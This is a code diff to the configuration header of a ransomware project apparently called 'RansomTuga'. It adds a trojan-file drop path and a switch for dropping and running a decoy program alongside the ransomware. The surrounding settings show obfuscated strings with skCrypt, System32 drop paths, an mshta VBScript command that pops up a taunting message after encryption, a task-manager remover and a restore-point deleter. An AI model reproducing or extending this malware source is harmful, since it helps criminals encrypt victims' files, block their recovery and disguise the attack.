@@ -33,6 +33,7 @@
 #define EMAILSENDER		(string)skCrypt("C:\\Windows\\System32\\sender.ps1")		// filepath of the email sender
 #define FILESICON		(string)skCrypt("C:\\Windows\\System32\\tugaIcon.ico")		// filepath of the default icon of encrypted files
 #define CUSTOMFILE_LOC	(string)skCrypt("C:\\customfile.extension")					// filepath of the custom file dropped
+#define TROJANFILE		(string)skCrypt("C:\\Windows\\System32\\trojanFile.jpg")	// filepath of the real program
 
 /* misc settings */
 #define CUSTOM_COMMAND		(string)skCrypt("mshta vbscript:Execute(\"msgbox \"\"You're fucked up!\",0,\"\"RansomTuga docet\"\":close\")")		// custom command that run after encryptions
@@ -41,6 +42,7 @@
 /* enabling features */
 #define DEBUG				true	// enable or disable debug mode (print in console)
 #define TROJAN				false	// enable or disable trojan (run real program in parallel with the ransomware)
+#define DROPRUN_TROJAN_FILE	true	// enable or disable droppper & runner of the real program in trojan mode
 #define TSK_REMOVER			true	// enable or disable remover of the taskmanagers
 #define DELETE_RESTOREPOINT false	// enable or disable restore points deleter
 #define CHANGE_FILE_ICON	false	// enable or disable custom icon for crypted files
